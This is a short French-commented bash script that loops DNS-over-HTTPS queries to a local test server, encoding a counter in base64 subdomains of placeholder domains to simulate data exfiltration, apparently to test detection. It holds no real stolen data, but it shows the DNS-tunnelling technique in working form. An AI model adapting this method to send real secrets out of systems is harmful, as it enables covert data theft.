#!/bin/bash

# Script pour effectuer des requêtes DoH en continu (pour tests d'exfiltration)

DOH_SERVER=${DOH_SERVER:-"https://doh.local/dns-query"}
DELAY=${DELAY:-5}

echo "=== Script d'exfiltration DoH ==="
echo "Serveur DoH: $DOH_SERVER"
echo "Délai entre requêtes: $DELAY secondes"

# Liste de domaines pour simuler l'exfiltration
DOMAINS=("example.com" "test.local" "data.local" "secret.local" "info.local")

counter=1
while true; do
    for domain in "${DOMAINS[@]}"; do
        echo "[$counter] Requête DoH pour $domain"
        
        # Requête DoH avec données encodées dans le sous-domaine (simulation d'exfiltration)
        encoded_data=$(echo -n "data$counter" | base64 | tr -d '=')
        query_domain="${encoded_data}.${domain}"
        
        curl -k -s -H "Accept: application/dns-json" \
             "${DOH_SERVER}?name=${query_domain}&type=A" \
             2>/dev/null | jq -r '.Status // "TIMEOUT"'
        
        sleep $DELAY
        ((counter++))
    done
done
